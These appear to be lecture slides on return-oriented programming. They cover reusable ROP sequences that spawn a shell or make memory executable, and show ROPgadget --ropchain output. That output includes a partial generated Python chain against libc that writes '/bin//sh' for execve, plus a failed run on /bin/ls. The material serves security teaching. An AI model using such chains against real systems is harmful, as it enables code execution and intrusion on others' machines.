
### common, reusable ROP sequences  {.smaller}


* most common idea: run a shell (command prompt) 

   * same thing ‘shellcode is named after’
   * <code>ROPchain --binary example --ropchain</code> tries to do this

* another possibilities: make memory executable + jump 

   * make ‘normal’ shellcode work

* probably more ideas 
<hr class="vspace" />
* if finding one of these in popular library…
* can reuse across a lot of applications


### ROPgadget --ropchain (works)  {.smaller}


```
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 \
             --offset 0x10000000 --ropchain
...
        #!/usr/bin/env python
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = b''
        p += pack('<Q', 0x00000000101056fd) # pop rdx ; pop rcx ; pop rbx ; ret
        p += pack('<Q', 0x00000000101eb1a0) # @ .data
        p += pack('<Q', 0x4141414141414141) # padding
        p += pack('<Q', 0x4141414141414141) # padding
        p += pack('<Q', 0x000000001004a550) # pop rax ; ret
        p += b'/bin//sh'
        p += pack('<Q', 0x00000000100374b0) # mov qword ptr [rdx], rax ; ret
...

```


### ROPgadget --ropchain (does not work?)  {.smaller}


```
ROPgadget --binary /bin/ls --ropchain
...
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x7694 mov byte ptr [rax], 0xa ; pop rbx ; pop rbp ; pop r12 ; ret
        [-] Can't find the 'pop rax' gadget. Try with another 'mov [reg], reg'

        [-] Can't find the 'mov qword ptr [r64], r64' gadget
...

```

